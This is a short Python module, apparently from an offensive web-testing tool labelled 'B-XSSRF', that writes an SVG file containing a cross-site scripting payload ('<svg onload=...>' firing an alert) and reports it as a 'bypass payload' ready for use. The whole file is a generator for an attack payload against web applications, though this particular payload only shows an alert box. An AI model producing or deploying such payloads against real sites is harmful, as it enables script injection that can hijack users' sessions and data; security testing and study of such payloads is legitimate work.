import os

def generate():
    print("\033[1;34m[*]\033[0m Generating bypass payloads...")
    payload_path = "output/payloads/xss_bypass.svg"
    os.makedirs("output/payloads", exist_ok=True)
    with open(payload_path, "w") as f:
        f.write('<svg onload="alert(\'B-XSSRF\')">')
    print(f"\033[1;32m[+]\033[0m Payload ready at: {payload_path}")
    return payload_path
